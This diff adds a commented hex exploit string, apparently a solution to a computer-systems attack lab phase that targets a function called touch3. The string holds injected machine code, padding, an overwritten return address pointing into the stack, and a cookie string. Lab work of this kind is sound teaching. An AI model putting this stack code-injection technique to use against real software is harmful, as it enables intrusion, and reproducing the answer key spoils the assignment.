@@ -1,0 +1,12 @@
+31 ff 					/* xor %edi to set it to 0 */
+81 c7 b8 2c 67 55		/* updating value of %edi to be the location of the string in the stack */
+68 9d 1a 40 00 			/* pushing address of touch3() to stack */
+c3 						/* return to touch3 instead of to test */
+ff ff 					
+ff ff ff ff ff ff ff ff /* using 42 bytes of padding */ 
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 2C 67 55 00 00 00 00 /* address of %rsp. This is where the injected code is stored. Reverse it (little endian). */
+35 37 38 38 65 39 65 37 /* cookie value converted to string (stored as hex) */ 
